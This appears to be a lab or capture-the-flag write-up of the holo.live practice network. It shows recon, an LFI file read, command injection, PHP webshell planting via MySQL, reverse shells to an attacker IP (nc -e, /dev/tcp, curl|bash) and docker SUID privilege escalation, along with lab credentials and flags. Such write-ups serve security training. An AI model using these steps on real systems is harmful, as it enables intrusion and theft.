# Initial Recon
Scope of engagment 10.200.110.0/24 and 192.168.100.0/24
## Nmap
Enumerating public facing IP's
See which IP's are up:
```bash
nmap -n 10.200.110.0/24
```
10.200.110.33 and 10.200.110.250
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-11 05:44 EDT
Nmap scan report for 10.200.110.33
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 10.200.110.250
Host is up (0.28s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 256 IP addresses (2 hosts up) scanned in 119.11 seconds
```
Saved as External-network-scan.nmap

Run scan on 10.200.110.33
```bash
nmap -sC -sV 10.200.110.33
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-11 06:18 EDT
Nmap scan report for 10.200.110.33
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:c0:f1:4d:49:de:5e:ec:14:51:dc:c5:75:18:aa:94 (RSA)
|   256 53:bb:46:12:93:e1:ab:09:90:a5:ef:54:87:e8:40:44 (ECDSA)
|_  256 9f:94:30:aa:76:42:10:0c:c2:0a:ae:a6:a1:48:00:91 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 21 disallowed entries (15 shown)
| /var/www/wordpress/index.php 
| /var/www/wordpress/readme.html /var/www/wordpress/wp-activate.php 
| /var/www/wordpress/wp-blog-header.php /var/www/wordpress/wp-config.php 
| /var/www/wordpress/wp-content /var/www/wordpress/wp-includes 
| /var/www/wordpress/wp-load.php /var/www/wordpress/wp-mail.php 
| /var/www/wordpress/wp-signup.php /var/www/wordpress/xmlrpc.php 
| /var/www/wordpress/license.txt /var/www/wordpress/upgrade 
|_/var/www/wordpress/wp-admin /var/www/wordpress/wp-comments-post.php
|_http-title: holo.live
|_http-generator: WordPress 5.5.3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
2 ports open.

## Port 80 enumeration
CME is wordpress running version 5.5.3
Title of the page is holo.live
The page pulls images from www.holo.live
Scan for more subdomains.
```bash
ffuf -u http://10.200.110.33 -H "Host: FUZZ.holo.live" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fl 157
```
3 domains:
- www
- dev
- admin
Running dir busting on all three sub domains.
www:
Nothing intresting just a wordpress install

dev:
admin.php, img.php, login.php

admin:
robots.txt
	/var/www/admin/supersecretdir/creds.txt
	the page gives a 403 error but is still there.

# Port 80 Exploitation
On the dev domain there is the img.php which can load in a file.
Checking for LFI.
```bash
curl http://dev.holo.live/img.php?file=../../../../../../../../etc/passwd
```
This returns the file.
Which means you can read out the creds.txt
```txt
I know you forget things, so I'm leaving this note for you:
admin:DBManagerLogin!
- gurag <3
```
Logging into the admin subdomain there is a dashboard.php.
Use the LFI to get the source code.
Quick grep for a parameter to check for RCE
```bash
cat dashboard.php | grep GET
```
This reveals a cmd variable.
which gives RCE.
try a reverse shell with the payload
```bash
nc -e /bin/bash 10.50.107.132 9001
```
This gives a shell on the box.
Stabilise the shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

User flag:
```
HOLO{175d7322f8fc53392a417ccde356c3fe}
```
# Foothold on 10.200.110.33
First thoughts are the computer name is random and it is linux. Docker? yep
find the groups on the docker instance.
```bash
cat /proc/1/cgroup
```
output:
```txt
12:blkio:/docker/b62a87548823a43de8309f7a906b15db3fe08fae6fb63e43aabb21a71c6c2592
11:devices:/docker/b62a87548823a43de8309f7a906b15db3fe08fae6fb63e43aabb21a71c6c2592
10:memory:/docker/b62a87548823a43de8309f7a906b15db3fe08fae6fb63e43aabb21a71c6c2592
9:cpuset:/docker/b62a87548823a43de8309f7a906b15db3fe08fae6fb63e43aabb21a71c6c2592
8:perf_event:/docker/b62a87548823a43de8309f7a906b15db3fe08fae6fb63e43aabb21a71c6c2592
7:cpu,cpuacct:/docker/b62a87548823a43de8309f7a906b15db3fe08fae6fb63e43aabb21a71c6c2592
6:hugetlb:/docker/b62a87548823a43de8309f7a906b15db3fe08fae6fb63e43aabb21a71c6c2592
5:pids:/docker/b62a87548823a43de8309f7a906b15db3fe08fae6fb63e43aabb21a71c6c2592
4:rdma:/
3:freezer:/docker/b62a87548823a43de8309f7a906b15db3fe08fae6fb63e43aabb21a71c6c2592
2:net_cls,net_prio:/docker/b62a87548823a43de8309f7a906b15db3fe08fae6fb63e43aabb21a71c6c2592
1:name=systemd:/docker/b62a87548823a43de8309f7a906b15db3fe08fae6fb63e43aabb21a71c6c2592
0::/system.slice/containerd.service
```

Check network config and do a ping sweep on the gatway
```bash
ifconfig
nc -zv 192.168.100.1 1-65535
```
Output:
```txt
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 33060 (?) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 8080 (http-alt) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 3306 (mysql) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 80 (http) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 22 (ssh) open
```
port 8080 seems to be a second website.
3306 is a sql database.

Check for the db_connect.php file in the webserver on the docker container.
read the file.
```txt
define('DB_SRV', '192.168.100.1');
define('DB_PASSWD', "!123SecureAdminDashboard321!");
define('DB_USER', 'admin');
define('DB_NAME', 'DashboardDB');
```
connect to the database.
```bash
mysql -u admin -p -h 192.168.100.1
```

Internal sql credentials:
admin:DBManagerLogin!
gurag:AAAA

inject a revshell into the sql database to break out of the docker container
```sql
mysql> select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
```
```bash
curl 192.168.100.1:8080/shell.php?cmd=id
```

now to get a reverse shell on the box.
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.50.107.132/9002 0>&1
```
host it an set up a listener then url enconde and pass as the cmd parameter of the webshell.
```bash
curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.107.132%3A80%2Fshell.sh%7Cbash%20%26'
```
Now a shell on 10.200.110.33
```txt
HOLO{3792d7d80c4dcabb8a533afddf06f666}
```

Priv esc.
check for SUID bit
```
find / -perm -u=s -type f 2>/dev/null
```
docker has a SUID priv esc.
```
sudo install -m =xs $(which docker) .

./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
